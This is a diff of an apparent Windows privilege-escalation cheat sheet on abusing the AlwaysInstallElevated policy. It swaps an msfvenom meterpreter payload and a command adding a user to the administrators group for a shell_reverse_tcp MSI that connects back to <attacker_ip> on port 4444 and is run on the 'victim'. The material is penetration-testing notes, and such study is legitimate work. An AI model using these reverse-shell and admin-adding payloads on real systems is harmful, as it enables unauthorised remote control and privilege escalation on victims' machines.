@@ -196,9 +196,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 - If yes, create malicious file.
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi-nouac -o evil.msi
-
-msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f msi-nouac -o setup.msi
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi-nouac -o evil.msi
 ```
 
 - Execute your file on victim.
